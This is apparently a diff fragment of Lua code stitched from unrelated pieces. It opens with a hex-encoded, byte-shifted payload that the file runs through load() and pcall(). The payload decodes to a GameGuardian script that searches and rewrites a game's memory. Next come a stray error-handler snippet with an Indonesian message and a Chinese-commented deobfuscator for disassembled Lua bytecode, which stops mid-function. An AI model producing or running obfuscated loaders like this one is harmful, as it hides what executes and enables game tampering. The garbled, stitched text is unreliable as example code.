6056545B6C525E624E59392D3D392D3A3E392D3D361A177F7283727F812D4A2D74743B7472815F728082798180353E3D3D392D7B7679392D7B7679392D7B7679392D7B7679392D7B7679392D7B7679392D7B7679392D7B7679361A1774743B727176814E7979352F3A3F2F392D74743B61665D526C53595C4E61361A1774743B807972727D353F3D361A177F7283727F812D4A2D74743B7472815F728082798180353E3D3D392D7B7679392D7B7679392D7B7679392D7B7679392D7B7679392D7B7679392D7B7679392D7B7679361A1774743B727176814E7979352F423D3D2F392D74743B61665D526C53595C4E61361A1774743B7D7F7C707280805F7280827A7235361A1774743B7079726E7F5F72808279818035361A171A1774743B807281637680766F797235736E798072361A1774743B8072815F6E7B7472803574743B5F5254565C5B6C505C51526C4E5D5D361A1774743B80726E7F70755B827A6F727F352F42422F392D74743B61665D526C53595C4E61392D736E798072392D74743B6056545B6C525E624E59392D3D392D3A3E392D3D361A177F7283727F812D4A2D74743B7472815F7280827981803546464646392D7B7679392D7B7679392D7B7679392D7B7679392D7B7679392D7B7679392D7B7679392D7B7679361A1774743B727176814E7979352F3F3F2F392D74743B61665D526C53595C4E61361A1774743B7079726E7F5F72808279818035361A171A1774743B807281637680766F797235736E798072361A1774743B8072815F6E7B7472803574743B5F5254565C5B6C505C51526C4E5D5D361A1774743B80726E7F70755B827A6F727F352F422F392D74743B61665D526C53595C4E61392D736E798072392D74743B6056545B6C525E624E59392D3D392D3A3E392D3D361A177F7283727F812D4A2D74743B7472815F728082798180353E3D3D392D7B7679392D7B7679392D7B7679392D7B7679392D7B7679392D7B7679392D7B7679392D7B7679361A1774743B727176814E7979352F3D3B3D3D3D3D3E2F392D74743B61665D526C53595C4E61361A177F7283727F812D4A2D74743B7472815F728082798180353E3D3D392D7B7679392D7B7679392D7B7679392D7B7679392D7B7679392D7B7679392D7B7679392D7B7679361A1774743B727176814E7979352F3D3B3D3D3D3D3E2F392D74743B61665D526C53595C4E61361A1774743B7079726E7F5F72808279818035361A1774743B7D7F7C707280805F7280827A7235361A1774743B817C6E8081352F5F524E51662D5F4E50522D2D4F5F5C6155525F2F361A1774743B807972727D35423D3D361A1774743B6E79727F81352F545C3B3B2D615C3B3B3B2D565B635661523B3B3B2D5F4E50523B3B3B2D4F5F5C6155525F3B3B3B2D5B5C6464642F361A1774743B807972727D353E423D3D361A171A1774743B807281637680766F797235736E798072361A1774743B8072815F6E7B7472803574743B5F5254565C5B6C4E5B5C5B665A5C6260361A1774743B80726E7F70755B827A6F727F352F3A3E3B3D462F392D74743B61665D526C53595C4E61392D736E798072392D74743B6056545B6C525E624E59392D3D392D3A3E392D3D361A1774743B7F7273767B725B827A6F727F352F3E2F392D74743B61665D526C53595C4E61392D736E798072392D74743B6056545B6C525E624E59392D3D392D3A3E392D3D361A171A17797C706E792D812D4A2D74743B7472815F72808279818035423D3D3D392D7B7679392D7B7679392D7B7679392D7B7679392D7B7679392D7B7679392D7B7679392D7B7679361A1774743B727176814E7979352F3E2F392D74743B61665D526C53595C4E61361A1774743B7D7F7C707280805F7280827A7235361A1774743B6E79727F81352F2D2D2D2D2D2D2D2D2D2D2DEFA19CEFA18EEFA18EEFA18EEFA18EEFA18EEFA18EEFA18EEFA18EEFA18EEFA18EEFA1A0697B697B697B2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D5152505B5C5F5A4E59697B697B697B2D2D2D2D2D2D2D2D2D2D2DEFA1A4EFA18EEFA18EEFA18EEFA18EEFA18EEFA18EEFA18EEFA18EEFA18EEFA18EEFA1A82F392FFDAAA78EFDAAA6C1FDAAA78FFDAAA6C1FDAAA7902F361A1774743B817C6E8081352FFDAA9D90FDAA9DABFDAA9DA7FDAA9DA9FDAA9DBAFDAA9DAFFDAA9DBCFDAA9DA7FDAA9DBAFDAA9DAB2F361A1774743B807972727D35463D3D361A1774743B817C6E8081352FFDAA9D9FFDAA9DA9FDAA9DB8FDAA9DAFFDAA9DB6FDAA9DBA2DFDAA9DA8FDAA9DBF2D472D7C7987756E802D746E7A722F361A177A6E767B5A727B8235361A17727B711A17727B711A171A171A171A171A171A171A171A171A171A171A171A171A171A171A171A171A171A171A171A171A171A171A171A171A171A171A171A171A171A171A171A171A171A171A171A171A171A171A171A171A171A171A171A171A171A171A171A171A171A171A171A171A171A171A171A171A171A171A171A171A171A171A171A171A171A171A171A171A171A171A171A171A171A171A171A171A171A171A171A171A171A171A171A171A171A171A171A171A171A171A171A171A171A171A171A171A171A171A171A171A171A171A171A171A171A171A171A171A171A171A171A171A171A171A171A171A171A171A171A171A171A171A171A171A171A171A171A171A171A171A171A171A171A171A171A171A171A171A171A171A171A171A171A171A171A171A171A171A171A171A171A171A171A171A1773827B7081767C7B2D7D7F7C747F6E7A813570796E8080392D7C7373807281392D817F86556E7F71392D6F7681403F392D836E79827261867D72361A175472816C8280727F6C767B7D82812D4A2D888A1A175472816C8280727F6C767B7D8281683E6A2D4A2D70796E80801A175472816C8280727F6C767B7D8281683F6A2D4A2D7C73738072811A175472816C8280727F6C767B7D828168406A2D4A2D817F86556E7F711A175472816C8280727F6C767B7D828168416A2D4A2D6F7681403F1A175472816C8280727F6C81867D722D4A2D836E79827261867D721A1780816E7F8135361A17727B711A171A171A1773827B7081767C7B2D797C7C7D507572707835361A1776732D7D7F7C747F6E7A2D4A4A2D3E2D8175727B1A17625635361A177279807276732D727F7F7C7F2D4A4A2D402D8175727B1A1780817C7D50797C807235361A17727B711A17727B711A171A171A171A171A171A171A1773827B7081767C7B2D737C827B716C357A7280806E7472361A1776732D727F7F7C7F2D4A4A2D3E2D8175727B1A17737C827B713F357A7280806E7472361A177279807276732D727F7F7C7F2D4A4A2D3F2D8175727B1A17737C827B7140357A7280806E7472361A177279807276732D727F7F7C7F2D4A4A2D402D8175727B1A17737C827B7141357A7280806E7472361A17727980721A17737C827B71357A7280806E7472361A17727B711A17727B711A171A171A171A171A171A1773827B7081767C7B2D737C827B71357A7280806E7472361A1776732D707C827B812D4A4A2D3D2D8175727B1A1774743B7079726E7F5F72808279818035361A1774743B7079726E7F5976808135361A1773767F80816C727F7F7C7F2D4A2D7A7280806E74721A17727F7F7C7F2D4A2D3E1A178072707C7B716C80816E7F8135361A17727B711A17727B711A171A171A171A171A171A1773827B7081767C7B2D737C827B713F357A7280806E7472361A1776732D707C827B812D4A4A2D3D2D8175727B1A1774743B7079726E7F5F72808279818035361A1774743B7079726E7F5976808135361A178072707C7B716C727F7F7C7F2D4A2D7A7280806E74721A17727F7F7C7F2D4A2D3F1A178175767F716C80816E7F8135361A17727B711A17727B711A171A171A171A171A171A1773827B7081767C7B2D737C827B7140357A7280806E7472361A1776732D707C827B812D4A4A2D3D2D8175727B1A1774743B7079726E7F5F72808279818035361A1774743B7079726E7F5976808135361A178175767F716C727F7F7C7F2D4A2D7A7280806E74721A17727F7F7C7F2D4A2D401A17737C827F81756C80816E7F8135361A17727B711A17727B711A171A171A171A171A171A1773827B7081767C7B2D737C827B7141357A7280806E7472361A1776732D707C827B812D4A4A2D3D2D8175727B1A1774743B7079726E7F5F72808279818035361A1774743B7079726E7F5976808135361A1774743B6E79727F81352FEFAA99FDAAA6BDFDAAA6BFFDAAA790FDAAA6C5FDAAA792FDAAA6BDFDAAA790FDAAA6C12DFDAAA6C5FDAAA6CA2DFDAAA790FDAAA6C4FDAAA6C12DFDAAA78EFDAAA6CBFDAAA6CBFDAAA6C9EFAA992F361A1774743B807281637680766F797235817F8272361A17797C7C7D507572707835361A17727B711A17727B711A171A171A171A171A171A1773827B7081767C7B2D8280727F6C767B7D82816C816E78727F35361A17474780817C7F8147471A1774743B7079726E7F5F72808279818035361A1776732D7D7F7C747F6E7A2D4A4A2D3E2D8175727B1A1776732D5472816C8280727F6C767B7D82812D4A4A2D7B76792D8175727B1A177172736E8279813E2D4A2D2F5D796E86727F507C7B817F7C7979727F2F1A177172736E8279813F2D4A2D2F3D853E41452F1A177172736E827981402D4A2D736E7980721A177172736E827981412D4A2D736E7980721A17727980721A177172736E8279813E2D4A5472816C8280727F6C767B7D8281683E6A1A177172736E8279813F2D4A2D5472816C8280727F6C767B7D8281683F6A1A177172736E827981402D4A2D5472816C8280727F6C767B7D828168406A1A177172736E827981412D4A2D5472816C8280727F6C767B7D828168416A1A17727B711A175472816C8280727F6C767B7D82812D4A2D74743B7D7F7C7A7D81351A17882FFDACA1BD60707F767D812D4F86FDACA1BD472D7D7F7C747F6E7A697B697B50796E80802D5B6E7A72472D2F392D2F5C7373807281472D2F392F617F862D556E7F71727F2D3A3A357172707F726E8072802D6E7070827F6E7086362F392F617F862D537C7F2D403F2D6F76812F8A391A17887172736E8279813E397172736E8279813F397172736E82798140397172736E827981418A391A17882F817285812F392F817285812F392F70757270786F7C852F392F70757270786F7C852F8A361A1776732D5472816C8280727F6C767B7D82812D8B4A2D7B76792D8175727B1A1776732D355472816C8280727F6C767B7D8281683E6A2D4A4A2D2F2F362D7C7F2D355472816C8280727F6C767B7D8281683F6A2D4A4A2D2F2F362D8175727B1A1774743B6E79727F81352FEF91C6FCC59C2D517C7B34812D59726E83722D567B7D82812D4F796E7B78EF91C6FCC59C2F361A17747C817C2D80817C7F811A17727B711A17727980721A1774743B6E79727F81352FEF91C6FCC59C2D527F7F7C7F2D472D617F862D6E746E767B2DEF91C6FCC59C2F361A17747C817C2D80817C7F811A17727B711A175472816C8280727F6C81867D722D4A2D74743B70757C76707235882F3E3B2D4F8681722D3C2D4F7C7C79726E7B2F392F3F3B2D51847C7F712D3C2D403F2D6F76812D567B812F392F403B2D5E847C7F712D3C2D43412D6F76812D567B812F392F413B2D53797C6E812F392F423B2D517C826F79722F8A397B7679392FFDACA1BD60707F767D812D4F86FDACA1BD472D7D7F7C747F6E7A697B697BEF91C6FCC59C2D50757C7C80722D6175722D5C82817D82812D61867D722DEF91C6FCC59C2F361A1776732D5472816C8280727F6C81867D722D4A4A2D3E2D8175727B1A175472816C8280727F6C81867D722D4A2D74743B61665D526C4F6661521A177279807276732D5472816C8280727F6C81867D722D4A4A2D3F2D8175727B1A175472816C8280727F6C81867D722D4A2D74743B61665D526C51645C5F511A177279807276732D5472816C8280727F6C81867D722D4A4A2D402D8175727B1A175472816C8280727F6C81867D722D4A2D74743B61665D526C5E645C5F511A177279807276732D5472816C8280727F6C81867D722D4A4A2D412D8175727B1A175472816C8280727F6C81867D722D4A2D74743B61665D526C53595C4E611A177279807276732D5472816C8280727F6C81867D722D4A4A2D422D8175727B1A175472816C8280727F6C81867D722D4A2D74743B61665D526C515C624F59521A17727B711A1776732D5472816C8280727F6C81867D722D8B4A2D74743B61665D526C4F6661522D8175727B1A1776732D355472816C8280727F6C767B7D8281683F6A2D322D41362D8B4A2D3D2D8175727B1A1774743B6E79727F81352FEF91C6FCC59C5572852D5C73738072812D5A8280812D4F722D4E7B2D5A827981767D79722D5C532D41EF91C6FCC59C2F361A17747C817C2D80817C7F811A17727B711A17727B711A17727B711A17727F7F7C7F2D4A2D3D2D1A17727B711A171A171A171A171A171A171A1773827B7081767C7B2D5C6C767B7681766E796C80726E7F707535361A1774743B807281637680766F797235736E798072361A1774743B817C6E8081352FFDACACAF595C4E51565B542D472D53767F80812D617F862F361A178280727F6C767B7D82812D4A2D2F472F3B3B5472816C8280727F6C767B7D8281683E6A2D1A1776732D5472816C8280727F6C767B7D828168406A2D8175727B1A177C737380812D4A2D3F421A17727980721A177C737380812D4A2D3D1A17727B711A17727B711A171A171A171A171A171A171A1773827B7081767C7B2D5C6C71767B7681766E796C80726E7F707535361A1776732D727F7F7C7F2D4B2D3E2D8175727B1A1774743B8072815F6E7B7472803574743B5F5254565C5B6C506C4E59595C50361A17727980721A1774743B8072815F6E7B7472803574743B5F5254565C5B6C5C6155525F361A17727B711A1774743B80726E7F70755B827A6F727F358280727F6C767B7D8281392D74743B61665D526C4F666152361A17707C827B812D4A2D74743B7472815F728082798180507C827B8135361A1776732D707C827B812D4A4A2D3D2D8175727B1A17737C827B716C352F5C6C71767B7681766E796C80726E7F70752F361A177F7281827F7B2D3D1A17727B711A175F7273767B727F2D4A2D74743B7472815F728082798180353E361A1774743B7F7273767B725B827A6F727F355F7273767B727F683E6A3B836E798272392D74743B61665D526C4F666152361A17707C827B812D4A2D74743B7472815F728082798180507C827B8135361A1776732D707C827B812D4A4A2D3D2D8175727B1A17737C827B716C352F5C6C71767B7681766E796C80726E7F70752F361A177F7281827F7B2D3D1A17727B711A17836E792D4A2D74743B7472815F72808279818035707C827B81361A1774743B6E7171597680815681727A8035836E79361A17727B711A171A171A171A171A171A171A1773827B7081767C7B2D504E6C7D7C767B81727F6C80726E7F707535361A1774743B7079726E7F5F72808279818035361A1774743B8072815F6E7B7472803574743B5F5254565C5B6C506C4E59595C502D892D74743B5F5254565C5B6C5C6155525F361A1774743B797C6E715F7280827981803574743B747281597680815681727A803536361A1774743B80726E7F70755D7C767B81727F357C73738081361A17707C827B812D4A2D74743B7472815F728082798180507C827B8135361A1776732D707C827B812D4A4A2D3D2D8175727B1A17737C827B716C352F504E6C7D7C767B81727F6C80726E7F70752F361A177F7281827F7B2D3D1A17727B711A178372792D4A2D74743B7472815F72808279818035707C827B81361A1774743B7079726E7F5976808135361A1774743B6E7171597680815681727A8035837279361A17727B711A171A171A171A171A171A171A1773827B7081767C7B2D504E6C6E7D7D79866C7C737380728135361A1776732D5472816C8280727F6C767B7D828168416A2D8175727B1A17816E7B78727F2D4A2D3D85737373737373737373737373737373451A17727980721A17816E7B78727F2D4A2D3D857373737373737373737373737373733D1A17727B711A17797C706E792D707C7D862D4A2D736E7980721A17797C706E792D792D4A2D74743B747281597680815681727A8035361A1776732D7B7C812D707C7D862D8175727B2D74743B7F727A7C8372597680815681727A803579362D727B711A17737C7F2D76392D832D767B2D767D6E767F803579362D717C1A1716833B6E71717F7280802D4A2D833B6E71717F7280802D382D816E7B78727F1A171676732D707C7D862D8175727B2D833B7B6E7A722D4A2D833B7B6E7A723B3B342D303F342D727B711A17727B711A1774743B6E7171597680815681727A803579361A17727B711A171A1773827B7081767C7B2D504E3F6C6E7D7D79866C7C737380728135361A1776732D5472816C8280727F6C767B7D828168416A2D8175727B1A17816E7B78727F2D4A2D3D85737373737373737373737373737373451A17727980721A17816E7B78727F2D4A2D3D857373737373737373737373737373733D1A17727B711A17797C706E792D707C7D862D4A2D736E7980721A17797C706E792D792D4A2D74743B747281597680815681727A8035361A1776732D7B7C812D707C7D862D8175727B2D74743B7F727A7C8372597680815681727A803579362D727B711A17737C7F2D76392D832D767B2D767D6E767F803579362D717C1A1716833B6E71717F7280802D4A2D833B6E71717F7280802D382D816E7B78727F1A171676732D707C7D862D8175727B2D833B7B6E7A722D4A2D833B7B6E7A723B3B342D303F342D727B711A17727B711A1774743B6E7171597680815681727A803579361A17727B711A171A171A171A171A171A171A1773827B7081767C7B2D5E6C6E7D7D79866C73768535361A1774743B8072815F6E7B7472803574743B5F5254565C5B6C4E5B5C5B665A5C6260361A1774743B797C6E715F7280827981803574743B747281597680815681727A803536361A1774743B7079726E7F5976808135361A17707C827B812D4A2D74743B7472815F728082798180507C827B8135361A1776732D707C827B812D4A4A2D3D2D8175727B1A17737C827B716C352F5E6C6E7D7D79866C7376852F361A177F7281827F7B2D3D1A17727B711A1786862D4A2D74743B7472815F728082798180353E3D3D3D361A1774743B7079726E7F5F72808279818035361A17762D4A2D3E1A17702D4A2D3E1A17802D4A2D888A1A1784757679722D35763A3E362D492D707C827B812D717C1A17868668766A3B6E71717F7280802D4A2D868668766A3B6E71717F7280802D382D3D856F413D3D3D3D3D3D3D3D3D3D3D3D3D3D1A1774743B80726E7F70755B827A6F727F35868668766A3B6E71717F728080392D74743B61665D526C5E645C5F51361A17707B812D4A2D74743B7472815F728082798180507C827B8135361A1776732D3D2D492D707B812D8175727B1A176F86817F2D4A2D74743B7472815F72808279818035707B81361A177B2D4A2D3E1A1784757679722D357B3A3E362D492D707B812D717C1A178068706A2D4A2D888A1A178068706A3B6E71717F7280802D4A2D6F86817F687B6A3B6E71717F7280801A178068706A3B73796E74802D4A2D403F1A177B2D4A2D7B2D382D3E1A17702D4A2D702D382D3E1A17727B711A17727B711A1774743B7079726E7F5F72808279818035361A17762D4A2D762D382D3E1A17727B711A1774743B6E7171597680815681727A803580361A17727B711A171A171A171A171A171A171A1773827B7081767C7B2D4E6C6F6E80726C836E79827235361A1774743B8072815F6E7B7472803574743B5F5254565C5B6C4E5B5C5B665A5C6260361A1774743B797C6E715F7280827981803574743B747281597680815681727A803536361A1774743B7079726E7F5976808135361A1774743B80726E7F70755D7C767B81727F357C73738081361A17707C827B812D4A2D74743B7472815F728082798180507C827B8135361A1776732D707C827B812D4A4A2D3D2D8175727B1A17737C827B716C352F4E6C6F6E80726C836E7982722F361A177F7281827F7B2D3D1A17727B711A178172792D4A2D74743B7472815F72808279818035707C827B81361A1774743B6E7171597680815681727A8035817279361A17727B711A171A171A171A171A171A171A1773827B7081767C7B2D4E6C6F6E80726C6E7070827F6E708635361A1774743B8072815F6E7B7472803574743B5F5254565C5B6C4E5B5C5B665A5C62602D892D74743B5F5254565C5B6C506C4E59595C50361A1774743B797C6E715F7280827981803574743B747281597680815681727A803536361A1774743B7079726E7F5976808135361A1774743B80726E7F70755D7C767B81727F357C73738081361A17707C827B812D4A2D74743B7472815F728082798180507C827B8135361A1776732D707C827B812D4A4A2D3D2D8175727B1A17737C827B716C352F4E6C6F6E80726C6E7070827F6E70862F361A177F7281827F7B2D3D1A17727B711A17787C792D4A2D74743B7472815F72808279818035707C827B81361A17762D4A2D3E1A17752D4A2D888A1A1784757679722D35763A3E362D492D707C827B812D717C1A177568766A2D4A2D888A1A177568766A3B6E71717F7280802D4A2D787C7968766A3B836E7982721A177568766A3B73796E74802D4A2D403F1A17762D4A2D762D382D3E1A17727B711A1774743B6E7171597680815681727A803575361A17727B711A171A171A171A171A171A171A1773827B7081767C7B2D4E6C8280727F6C747683727B6C7C737380728135361A17797C706E792D7C79716C806E83726C797680812D4A2D74743B747281597680815681727A8035361A17737C7F2D76392D832D767B2D767D6E767F80357C79716C806E83726C79768081362D717C1A17833B6E71717F7280802D4A2D833B6E71717F7280802D382D5472816C8280727F6C767B7D8281683F6A1A17833B73796E74802D4A2D5472816C8280727F6C81867D721A17727B711A1774743B7079726E7F5F72808279818035361A1774743B7079726E7F5976808135361A1774743B797C6E715F728082798180357C79716C806E83726C79768081361A17707C827B812D4A2D74743B7472815F728082798180507C827B8135361A1776732D707C827B812D4A4A2D3D2D8175727B1A17737C827B716C352F5E6C6E7D7D79866C73768538382F361A177F7281827F7B2D3D1A17727B711A1774743B807281637680766F797235817F8272361A17727B711A171A171A171A171A171A1773827B7081767C7B2D80816E7F8135361A178280727F6C767B7D82816C816E78727F35361A175C6C767B7681766E796C80726E7F707535361A175C6C71767B7681766E796C80726E7F707535361A1776732D727F7F7C7F2D4B2D3D2D8175727B1A177F7281827F7B2D3D1A17727B711A17504E6C7D7C767B81727F6C80726E7F707535361A1776732D727F7F7C7F2D4B2D3D2D8175727B1A177F7281827F7B2D3D1A17727B711A17504E6C6E7D7D79866C7C737380728135361A1776732D727F7F7C7F2D4B2D3D2D8175727B1A177F7281827F7B2D3D1A17727B711A174E6C6F6E80726C836E79827235361A1776732D727F7F7C7F2D4B2D3D2D8175727B1A177F7281827F7B2D3D1A17727B711A1776732D7C737380812D4A4A2D3D2D8175727B1A174E6C6F6E80726C6E7070827F6E708635361A17727B711A1776732D727F7F7C7F2D4B2D3D2D8175727B1A177F7281827F7B2D3D1A17727B711A174E6C8280727F6C747683727B6C7C737380728135361A1776732D727F7F7C7F2D4B2D3D2D8175727B1A177F7281827F7B2D3D1A17727B711A17797C7C7D507572707835361A1776732D727F7F7C7F2D4B2D3D2D8175727B1A177F7281827F7B2D3D1A17727B711A17727B711A171A171A171A171A171A171A1773827B7081767C7B2D8072707C7B716C80816E7F8135361A1774743B817C6E8081352FFDACACAE595C4E51565B542D472D6072707C7B712D617F862F361A175C6C71767B7681766E796C80726E7F707535361A1776732D727F7F7C7F2D4B2D3E2D8175727B1A177F7281827F7B2D3D1A17727B711A17504E6C7D7C767B81727F6C80726E7F707535361A1776732D727F7F7C7F2D4B2D3E2D8175727B1A177F7281827F7B2D3D1A17727B711A17504E6C6E7D7D79866C7C737380728135361A1776732D727F7F7C7F2D4B2D3E2D8175727B1A177F7281827F7B2D3D1A17727B711A175E6C6E7D7D79866C73768535361A1776732D727F7F7C7F2D4B2D3E2D8175727B1A177F7281827F7B2D3D1A17727B711A1776732D7C737380812D4A4A2D3D2D8175727B1A174E6C6F6E80726C6E7070827F6E708635361A17727B711A1776732D727F7F7C7F2D4B2D3E2D8175727B1A177F7281827F7B2D3D1A17727B711A174E6C8280727F6C747683727B6C7C737380728135361A1776732D727F7F7C7F2D4B2D3E2D8175727B1A177F7281827F7B2D3D1A17727B711A17797C7C7D507572707835361A1776732D727F7F7C7F2D4B2D3E2D8175727B1A177F7281827F7B2D3D1A17727B711A17727B711A171A171A171A171A171A171A1773827B7081767C7B2D8175767F716C80816E7F8135361A1774743B817C6E8081352FFDACA1C1595C4E51565B542D472D6175767F712D617F862F361A175C6C71767B7681766E796C80726E7F707535361A1776732D727F7F7C7F2D4B2D3F2D8175727B1A177F7281827F7B2D3D1A17727B711A17504E6C7D7C767B81727F6C80726E7F707535361A1776732D727F7F7C7F2D4B2D3F2D8175727B1A177F7281827F7B2D3D1A17727B711A1776732D7C737380812D4A4A2D3D2D8175727B1A17504E3F6C6E7D7D79866C7C737380728135361A17727B711A1776732D727F7F7C7F2D4B2D3F2D8175727B1A177F7281827F7B2D3D1A17727B711A174E6C6F6E80726C836E79827235361A1776732D727F7F7C7F2D4B2D3F2D8175727B1A177F7281827F7B2D3D1A17727B711A1776732D7C737380812D4A4A2D3D2D8175727B1A174E6C6F6E80726C6E7070827F6E708635361A17727B711A1776732D727F7F7C7F2D4B2D3F2D8175727B1A177F7281827F7B2D3D1A17727B711A174E6C8280727F6C747683727B6C7C737380728135361A1776732D727F7F7C7F2D4B2D3F2D8175727B1A177F7281827F7B2D3D1A17727B711A17797C7C7D507572707835361A1776732D727F7F7C7F2D4B2D3F2D8175727B1A177F7281827F7B2D3D1A17727B711A17727B711A171A171A171A171A171A171A1773827B7081767C7B2D737C827F81756C80816E7F8135361A1774743B817C6E8081352FEFA5AFFCC59C595C4E51565B542D472D537C827F81752D617F862F361A175C6C71767B7681766E796C80726E7F707535361A17504E6C7D7C767B81727F6C80726E7F707535361A17504E3F6C6E7D7D79866C7C737380728135361A175E6C6E7D7D79866C73768535361A1776732D7C737380812D4A4A2D3D2D8175727B1A174E6C6F6E80726C6E7070827F6E708635361A17727B711A174E6C8280727F6C747683727B6C7C737380728135361A17797C7C7D507572707835361A17727B711A171A171A171A171A171A171A171A1773827B7081767C7B2D625635361A1774743B80757C8462764F8281817C7B35361A1784757679722D817F82722D717C1A1776732D74743B76805079767078727162764F8281817C7B35362D8175727B1A1780816E7F8135361A17727B711A17727B711A17727B711A171A171A171A171A171A171A1773827B7081767C7B2D80817C7D50797C807235361A1784757679722D817F82722D717C1A177A6E767B5A727B8235361A1774743B807281637680766F797235736E798072361A1784757679722D74743B7680637680766F797235362D4A4A2D736E7980722D717C1A17727B711A17727B711A17727B711A171A171A171A1776732D7D7F7C747F6E7A2D4A4A2D3F2D8175727B1A1780817C7D50797C807235361A17727980721A17625635361A17727B71')
+local enc = load(data)
+pcall(enc)
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+-- ⛑️ Tangani force close / error
+xpcall(mainLoop, function(err)
+  autoCleanup()
+  gg.toast("Script dihentikan paksa. Semua data dibersihkan.")
+end)
+
+ local yx=io.open("1.lua","r"):read("*a")
+yx=yx..".func F测试"
+local s=0
+local jmp={}
+local my=986666
+local Zl={
+	["EQ"]=2,
+	["LE"]=2,
+	["LT"]=2,
+	["TEST"]=2,
+	["TESTSET"]=2,
+}
+function jmp.hf(tab,cs)
+	tab="\n\n\n\n"..tab.."\n\n\n"
+	tab = tab:gsub("; .local v[^\n]+","")
+	:gsub("; .end local v[^\n]+","")
+	:gsub("%s*\n%s*","\n")
+	:gsub("[^\n]*; garbage[^\n]*", "")
+	:gsub("%.line %d+","")
+	:gsub("[^\n]*; unused[^\n]*", "")
+	:gsub("%s*\n%s*","\n")
+	:gsub("\n:goto_%d+\n:goto","\n:goto")
+	:gsub("JMP([^\n]+\nJMP[^\n]+)","JMMP%1")
+	:gsub("(FORLOOP v%d+ :goto_%d+[^\n]*%s+)RETURN",function(x)
+		my=my+1
+		return x.."JMP :goto_"..my.."\n:goto_"..my.."\nRETURN"
+	end)
+	:gsub("(\n:goto_%d+)(\nRETURN[^\n]*)(\n:goto)","%1%2\nJMP :goto_999999%3")
+	:gsub("(\n:goto_%d+)(\nTAILCALL[^\n]*)(\n:goto)","%1%2\nJMP :goto_999999%3")
+	local fnal=tab:match(".+JMP :goto_%d+[^\n]*(.*)")
+	if fnal==nil then
+	    fnal=""
+	end
+	local a={}
+	for i,k,v in tab:gmatch("\n(:goto_)(%d+)(\n.-JMP[^\n]+)") do--提取所有jmp
+		a[tonumber(k)]=i..k..v
+		if v:find("\n:goto") then
+		end
+	end
+	local w1 = tab:match("%S+")
+	local c1,c2,c3,c4,c0={}
+	if w1~=nil then
+		if Zl[w1] then
+			c0=tab:match("[^\n]+\n[^\n]+")
+			c2=c0:match("JMMP :goto_(%d+)")
+			if c2~=nil then
+				c4=c0:gsub("JMMP :goto_","JMP :goto_")
+				repeat
+					if a[tonumber(c2)]==nil then
+						break
+					end
+					c1[#c1+1]=a[tonumber(c2)]
+					a[tonumber(c2)]=nil
+					if c2~=nil then
+						c3=c2
+					end
+					c2=c1[#c1]:match(".+JMP[^\n]+:goto_(%d+)")
+					if c2==nil or not a[tonumber(c2)] then
+						break
+					end
+				until c2==nil or not a[tonumber(c2)]
+				for i,k in pairs(c1) do--删掉无用jmp
+					if i~=#c1 then
+						c1[i]=k:match("(.+)\n[^\n]+")
+					elseif  i == #c1 and k:find("JMP[^\n]+:goto_999999") ~= nil then
+						c1[i]=k:match("(.+)\n[^\n]+")
+					end
+				end
+				c1=table.concat(c1,"\n")
+			end
+		end
+	end
+	local st=tab:match("JMP[^\n]+:goto_(%d+)")--匹配第一个jmp
+	local b={}
+	repeat--第一次逻辑恢复
+		if a[tonumber(st)]==nil then
+			break
+		end
+		b[#b+1]=a[tonumber(st)]
+		a[tonumber(st)]=nil
+		st=b[#b]:match(".+JMP[^\n]+:goto_(%d+)")
+		if st==nil or not a[tonumber(st)] then
+			break
+		end
+	until st==nil or not a[tonumber(st)]
+	if not b[1] then
+	    if cs then
+	    	print("恢复第"..cs.."区块失败 or 不需要恢复")
+	    	return "No"
+	    else
+	        print(b)
+	        print(a)
+	        os.exit()
+	    end
+	end
+	for i,k in pairs(b) do--删掉无用jmp
+		if i~=#b then
+			b[i]=k:match("(.+)\n[^\n]+")
+		elseif  i == #b and k:find("JMP[^\n]+:goto_999999") ~= nil then
+			b[i]=k:match("(.+)\n[^\n]+")
+		end
+	end
+	b=table.concat(b,"\n")
+
+	for i,k in pairs(a) do
+		if k:find("JMP[^\n]+:goto_999999") then
+			b = b.."\n"..a[i]:match("(.+)\nJMP[^\n]+:goto_999999")
+			a[i] = nil
+		end
+	end
+	local sss=100000
+	local xmx
+	b = b:gsub("JMMP[^\n]+:goto_(%d+)([^\n]+)",function(z,l)--查找逻辑指令跳转分支
+		local v,u=a[tonumber(z)]
+		if v==nil then
+			return "JMP :goto_"..z..l
+		end
+		
+		a[tonumber(z)]=nil
+		v,u=v:match("(:goto_%d+.+)JMP[^\n]+:goto_(%d+)")
+		if a[tonumber(u)] then
+			a[tonumber(u)]=a[tonumber(u)]:gsub("(:goto_"..u.."\n)","%1"..v.."\n")
+		else
+			if not xmx then
+				xmx = {}
+			end
+			xmx[u]=v
+		end
+		return "JMP :goto_"..u
+	end)
+	if xmx then
+		for i,k in pairs(xmx) do
+			b=b:gsub("(\n:goto_"..i.."\n)","%1"..k)
+		end
+	end
+	xmx=nil
+
+	b=b:gsub("JMP[^\n]+:goto_(%d+)[^\n]*",function(x)--查找是否有jmp残留
+		if b:find("\n:goto_"..x.."\n")~=nil then
+			return "JMP :goto_"..x
+		end
+		local lx=x
+		local t={}
+		repeat
+			if not a[tonumber(x)] then
+				break
+			end
+			t[#t+1]=a[tonumber(x)]
+			a[tonumber(x)]=nil
+			x=t[#t]:match(".+JMP[^\n]+:goto_(%d+)")
+			if x==nil or not a[tonumber(x)] then
+				break
+			end
+		until x==nil or not a[tonumber(x)]
+		if not t[1] then
+			return "JMP :goto_"..x
+		end
+		sss=sss+1
+		for i, k in pairs(t) do
+			t[i]=k:match("(.+)\n[^\n]+")
+		end
+		return "JMP :goto_"..lx.."\nJMP :goto_"..sss.."\n"..table.concat(t,"\n").."\n:goto_"..sss
+end)
+
+::mlst::
+	b=b:gsub("JMMP :goto_(%d+)[^\n]*",function(x)
+		if b:find("\n:goto_"..x.."\n")~=nil then
+			return "JMP :goto_"..x
+		end
+		local lx=x
+		local t={}
+		repeat
+			if not a[tonumber(x)] then
+				break
+			end
+			t[#t+1]=a[tonumber(x)]
+			a[tonumber(x)]=nil
+			x=t[#t]:match(".+JMP[^\n]+:goto_(%d+)")
+			if x==nil or not a[tonumber(x)] then
+				break
+			end
+		until x==nil or not a[tonumber(x)]
+		if not t[1] then
+			return "JMP :goto_"..x
+		end
+		sss=sss+1
+		for i, k in pairs(t) do
+			t[i]=k:match("(.+)\n[^\n]+")
+		end
+		return "JMP :goto_"..lx.."\nJMP :goto_"..sss.."\n"..table.concat(t,"\n").."\n:goto_"..sss
+end)
